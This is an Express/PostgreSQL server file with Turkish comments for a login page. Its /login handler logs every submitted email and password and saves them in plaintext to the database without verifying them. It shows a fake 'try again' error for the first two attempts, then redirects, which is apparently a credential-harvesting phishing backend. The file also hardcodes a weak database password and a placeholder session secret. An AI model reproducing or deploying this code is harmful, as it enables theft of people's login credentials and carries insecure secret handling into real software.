// Gerekli modüller
const express = require('express');
const { Client } = require('pg');
const bodyParser = require('body-parser');
const session = require('express-session'); // Session modülünü ekliyoruz

// PostgreSQL bağlantısı
const client = new Client({
  user: 'postgres',
  host: '127.0.0.1',
  database: 'postgres', // Burada veritabanınızın adını yazın
  password: '1', // Şifrenizi burada yazın
  port: 5432,
});

client.connect()
  .then(() => console.log('PostgreSQL bağlantısı başarılı!'))
  .catch(err => console.error('Bağlantı hatası:', err.stack));

// Express uygulaması oluşturma
const app = express();
const port = 3005;

// EJS şablon motoru olarak kullan
app.set('view engine', 'ejs');

// Body parser middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Session middleware
app.use(session({
  secret: 'secret_key', // Bu güvenlik anahtarı uygulamanız için rastgele bir değer olmalıdır
  resave: false,
  saveUninitialized: true,
}));

// Statik dosya servisi (resimler, stil dosyaları vb.)
app.use(express.static('public'));

// Ana sayfa (login formu) için GET isteği
app.get('/', (req, res) => {
  res.render('index', { error: null }); // error null olarak başlatılıyor
});

// login POST isteği
app.post('/login', (req, res) => {
  const { email, password } = req.body;

  // Gelen verileri konsola yazdırın
  console.log('Gelen Veriler:', { email, password });

  // Veriler boşsa, hata mesajı ile ana sayfaya yönlendir
  if (!email || !password) {
    return res.render('index', { error: 'Email ve şifre boş olamaz!' });
  }

  // Kullanıcıyı her girişte veritabanına ekle
  const insertQuery = 'INSERT INTO users (email, password) VALUES ($1, $2)';
  const insertValues = [email, password];

  client.query(insertQuery, insertValues, (insertErr, insertResult) => {
    if (insertErr) {
      console.error('Veritabanı hatası:', insertErr.stack);
      return res.status(500).send('Veritabanına veri eklenirken hata oluştu.');
    }

    console.log('Kullanıcı başarıyla kaydedildi:', insertResult);

    // Eğer loginCount yoksa, başlatıyoruz
    if (!req.session.loginCount) {
      req.session.loginCount = 1;
    } else {
      req.session.loginCount += 1;  // Giriş sayısını arttırıyoruz
    }

    // İlk 2 girişte sadece index sayfasına dönüyoruz
    if (req.session.loginCount < 3) {
      return res.render('index', { error: 'Başka bir giriş yapmak için tekrar deneyin.' });
    }
    
    // 3. girişte about sayfasına yönlendiriyoruz
    req.session.loggedIn = true;
    res.redirect('/about');
  });
});

// About sayfası GET isteği
app.get('/about', (req, res) => {
  if (!req.session.loggedIn) {
    // Eğer kullanıcı giriş yapmamışsa, ana sayfaya yönlendir
    return res.redirect('/');
  }
  res.render('about');  // about.ejs şablonunu render eder
});

// Sunucuyu başlatma
app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor...`);
});
